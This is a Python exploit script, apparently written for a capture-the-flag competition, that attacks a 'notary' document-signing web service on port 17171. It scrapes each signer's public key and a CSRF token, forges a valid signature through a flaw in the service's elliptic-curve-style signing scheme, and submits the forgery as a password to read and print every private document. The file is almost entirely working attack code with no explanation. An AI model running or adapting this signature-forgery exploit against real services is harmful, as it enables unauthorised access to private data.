#!/usr/bin/env python3

import re
import sys
import string
import struct
import random
import msgpack
import requests

import notary


def find_pair(x):
    alpha = set(map(ord, string.ascii_letters + string.digits)) ^ set(range(128, 256))

    for y in alpha:
        if x ^ y in alpha:
            return y, x ^ y


def forge_data(expected, length, prefix, suffix):
    prefix = prefix.ljust(2 * length, b'X')
    suffix = suffix.rjust(2 * length, b'X')

    blocks = [[], []]

    for x, y, z in zip(prefix, suffix, expected):
        pair = find_pair(x ^ y ^ z ^ 0xFF)

        for block, value in zip(blocks, pair):
            block.append(value)

    return prefix + b''.join(map(bytes, blocks)) + suffix


def forge_signature(public_key, prefix, suffix):
    length = (public_key.N.bit_length() + 7) // 8

    signature_point = notary.Point(
        random.randrange(2, public_key.N - 2),
        random.randrange(2, public_key.N - 2)
    )

    curve = notary.curve_from_point(signature_point, public_key.N)
    data_point = notary.point_multiply(signature_point, public_key.e, curve)
    expected = notary.point_to_data(data_point, public_key.N)

    data = forge_data(expected, length, prefix, suffix)

    return data, notary.pack_numbers(signature_point.x, signature_point.y)


def generate_password(public_key, document_id):
    public = notary.Public(*notary.load_numbers(public_key))

    length = (public.N.bit_length() + 7) // 8
    
    obj = {
        'title': 'document_id',
        'text': str(document_id),
        'garbage': None
    }

    prefix = msgpack.dumps(obj)[:-1]
    garbage_length = 2 * 4 * length - len(prefix) - 3
    prefix += b'\xc5' + struct.pack('>H', garbage_length)

    suffix = b''
    
    fake_data, signature = forge_signature(public, prefix, suffix)

    assert notary.verify_sign(public_key, fake_data, signature)

    return f'{notary.serialize_bytes(fake_data)}.{notary.serialize_bytes(signature)}'


def download_document(url, document_url):
    session = requests.session()

    html = session.get(url + document_url).text
    user_url = re.search(r'Signed by <a href="(.*?)">', html).group(1)
    
    html = session.get(url + user_url).text
    public_key = re.search(r'<code>(.*?)</code>', html).group(1)
    
    html = session.get(url + document_url).text
    csrf_token = re.search(r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', html).group(1)
    
    document_id = document_url[len('/doc/'):]
    public_key = notary.deserialize_bytes(public_key)

    password = generate_password(public_key, document_id)

    html = session.post(url + document_url, data={'csrf_token': csrf_token, 'password': password}).text
    text = re.search(r'<p>(.*?)</p>', html).group(1)

    return text


def main():
    IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    PORT = 17171

    url = f'http://{IP}:{PORT}'

    html = requests.get(url).text
    document_urls = re.findall(r'<a href="(/doc/.*?)">.*?<p>(.*?)</p>', html, re.DOTALL)

    for document_url, text in document_urls:
        if 'Private document' in text:
            content = download_document(url, document_url)
            print(document_url, content)


if __name__ == '__main__':
    main()
